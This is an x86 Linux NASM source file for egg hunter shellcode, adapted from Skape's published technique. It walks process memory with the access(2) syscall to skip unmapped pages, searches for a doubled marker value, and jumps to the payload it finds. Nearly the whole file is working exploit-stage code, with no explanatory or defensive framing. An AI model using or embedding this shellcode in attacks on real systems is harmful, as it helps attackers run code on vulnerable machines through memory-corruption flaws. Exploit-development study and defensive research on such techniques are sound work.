; Filename: egghunter.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Egg Hunter shellcode using the access(2) syscall
; Adapted from the PoC code within the paper written by Skape
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf


global _start			

section .text
_start:


mov ebx, 0x50905090
xor ecx, ecx
mul ecx

page:
	or dx, 0xfff
incr:
	inc edx
	pusha

lea ebx, [edx+0x4]
mov al, 0x21
int 0x80

cmp al, 0xf2
popa
jz short page

cmp [edx], ebx
jnz short incr

cmp [edx+0x4], ebx
jne short incr

jmp edx
